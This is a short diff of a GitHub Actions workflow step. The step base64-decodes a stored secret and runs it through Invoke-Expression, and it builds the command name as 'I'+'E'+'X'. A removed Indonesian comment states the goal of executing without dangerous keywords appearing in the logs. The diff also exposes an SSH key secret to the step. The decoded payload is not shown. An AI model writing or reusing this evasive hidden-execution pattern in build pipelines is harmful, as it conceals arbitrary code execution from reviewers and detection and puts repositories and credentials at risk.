@@ -27,9 +27,8 @@ jobs:
         shell: powershell
         env:
           LETS_GO: ${{ secrets.R4DX_EXECUTE }}
-          D_KEY: ${{ secrets.DECRYPT_KEY }} # Pastikan key dekripsi ada
+          R4DX_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          # Dekode dan eksekusi tanpa memunculkan keyword berbahaya di log
           $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:LETS_GO))
           $e = "I" + "E" + "X"
           & $e ($d)
